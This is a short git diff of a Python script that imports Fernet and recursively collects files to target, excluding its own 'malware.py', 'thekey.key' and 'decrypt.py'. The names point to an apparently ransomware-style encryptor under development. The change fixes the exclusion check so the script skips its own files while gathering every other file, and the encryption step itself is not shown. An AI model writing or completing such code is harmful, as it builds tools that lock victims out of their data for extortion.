@@ -4,9 +4,9 @@ from cryptography.fernet import Fernet
 files = []
 def add_files_by_dir(path: str='.'):
     for file in os.listdir(path):
-        file = os.path.join(path, file)
         if file in ('malware.py', 'thekey.key', 'decrypt.py', '.gitignore', 'requirements.txt', '.git', '.venv'):
             continue
+        file = os.path.join(path, file)
         if os.path.isfile(file):
             files.append(file)
         else:
